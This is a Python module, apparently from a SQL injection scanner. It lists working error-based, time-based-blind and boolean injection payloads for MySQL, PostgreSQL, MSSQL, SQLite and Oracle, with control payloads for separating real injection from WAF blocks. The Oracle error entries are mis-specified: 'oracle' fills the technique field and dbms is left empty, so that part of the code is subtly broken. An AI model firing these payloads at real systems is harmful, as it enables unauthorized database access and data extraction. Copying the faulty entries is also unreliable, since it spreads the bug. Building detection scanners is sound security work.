from dataclasses import dataclass
from typing import Optional


@dataclass
class Payload:
    value: str
    technique: str
    dbms: Optional[str] = None
    expected_evidence: Optional[str] = None


ERROR_PAYLOADS: list[Payload] = [
    # MySQL
    Payload("'", "error-based", "mysql"),
    Payload("' OR '1'='1", "error-based", "mysql"),
    Payload("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", "error-based", "mysql"),
    Payload("' AND 1=1-- ", "error-based", "mysql"),
    Payload("' UNION SELECT 1,2,3-- ", "error-based", "mysql"),
    Payload("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- ", "error-based", "mysql"),
    Payload("' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- ", "error-based", "mysql"),
    # PostgreSQL
    Payload("' OR '1'='1", "error-based", "postgresql"),
    Payload("' AND 1=CAST((SELECT version()) AS int)-- ", "error-based", "postgresql"),
    Payload("1' AND 1=1-- ", "error-based", "postgresql"),
    Payload("'; SELECT pg_sleep(0)-- ", "error-based", "postgresql"),
    Payload("' UNION SELECT NULL,NULL-- ", "error-based", "postgresql"),
    Payload("' AND 1=1; SELECT * FROM pg_sleep(0)-- ", "error-based", "postgresql"),
    # MSSQL
    Payload("' OR '1'='1", "error-based", "mssql"),
    Payload("1' AND 1=1-- ", "error-based", "mssql"),
    Payload("'; WAITFOR DELAY '0:0:0'-- ", "error-based", "mssql"),
    Payload("' UNION SELECT NULL,NULL-- ", "error-based", "mssql"),
    Payload("' HAVING 1=1-- ", "error-based", "mssql"),
    Payload("' AND 1=CONVERT(int, @@version)-- ", "error-based", "mssql"),
    # SQLite
    Payload("' OR '1'='1", "error-based", "sqlite"),
    Payload("' AND 1=1-- ", "error-based", "sqlite"),
    Payload("' UNION SELECT 1,2,3-- ", "error-based", "sqlite"),
    Payload("' AND randomblob(0)-- ", "error-based", "sqlite"),
    # Oracle
    Payload("' OR '1'='1", "oracle"),
    Payload("' AND 1=1-- ", "oracle"),
    Payload("' UNION SELECT NULL,NULL FROM DUAL-- ", "oracle"),
    Payload("' AND 1=UTL_INADDR.get_host_name('0')-- ", "oracle"),
    Payload("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),0)-- ", "oracle"),
]

TIME_PAYLOADS: list[Payload] = [
    Payload("' OR SLEEP(5)-- ", "time-based-blind", "mysql"),
    Payload("' OR SLEEP(3)-- ", "time-based-blind", "mysql"),
    Payload("' AND SLEEP(5)-- ", "time-based-blind", "mysql"),
    Payload("'; WAITFOR DELAY '0:0:5'-- ", "time-based-blind", "mssql"),
    Payload("'; WAITFOR DELAY '0:0:3'-- ", "time-based-blind", "mssql"),
    Payload("' OR pg_sleep(5)-- ", "time-based-blind", "postgresql"),
    Payload("' OR pg_sleep(3)-- ", "time-based-blind", "postgresql"),
    Payload("' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),5)-- ", "time-based-blind", "oracle"),
    Payload("' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),3)-- ", "time-based-blind", "oracle"),
    Payload("' OR randomblob(500000000)-- ", "time-based-blind", "sqlite"),
]

# Canonical boolean pair tested first on every point.
CANONICAL_BOOLEAN_PAIR: tuple[str, str] = ("' OR 1=1-- ", "' OR 1=2-- ")

# Escalation pairs, tested (2 requests each) only when the canonical pair
# is ambiguous. Each is a (TRUE, FALSE) payload pair. The numeric no-quote
# pairs start with a digit ("1 OR ...") so full-value replacement in a numeric
# context yields "id = 1 OR 1=1--" (valid SQL) rather than "id = OR 1=1--"
# (syntax error).
BOOLEAN_PAIRS: list[tuple[str, str]] = [
    CANONICAL_BOOLEAN_PAIR,
    # numeric, no quote
    ("1 OR 1=1-- ", "1 OR 1=2-- "),
    # parenthesis close
    ("') OR 1=1-- ", "') OR 1=2-- "),
    # AND true/false variant
    ("' AND 1=1-- ", "' AND 1=0-- "),
    # single-quote string equality
    ("' OR '1'='1'-- ", "' OR '1'='2'-- "),
]

# The 5 escalation pairs (everything except the canonical first pair).
ESCALATION_BOOLEAN_PAIRS: list[tuple[str, str]] = BOOLEAN_PAIRS[1:]


def get_error_payloads() -> list[Payload]:
    return ERROR_PAYLOADS


def get_time_payloads() -> list[Payload]:
    return TIME_PAYLOADS


# Negative-control payloads used by the status differential to check whether a
# 5xx response is attributable to SQL at all. Two classes:
#   - raw garbage       -> refutes "app that 5xxs on any malformed/odd input"
#   - valid-SQL lookalike -> shares the shape a WAF matches on (operators,
#                            comments) but parses as VALID SQL in BOTH string
#                            and numeric contexts, so on a genuinely injectable
#                            point (no WAF) it returns 2xx and the control
#                            passes, while a WAF that blocks by pattern fires
#                            on it and the control fails.
# IMPORTANT: these MUST be valid SQL — a control that raises a real SQL error
# on an injectable backend suppresses the true positive (verified with SQLite:
# leading-digit form works in string and numeric contexts).
# If a control also induces 5xx, the point's 5xx is not attributable to an SQL
# injection and no error-based finding is emitted.
CONTROL_PAYLOADS: list[Payload] = [
    # raw garbage (never valid anywhere)
    Payload("\x00\x01\x02\x03", "control"),
    Payload("A" * 512, "control"),
    # valid-SQL lookalikes: parse in string AND numeric contexts
    Payload("1 OR 1=1-- ", "control"),
    Payload("1=1-- ", "control"),
]


def get_control_payloads() -> list[Payload]:
    return CONTROL_PAYLOADS
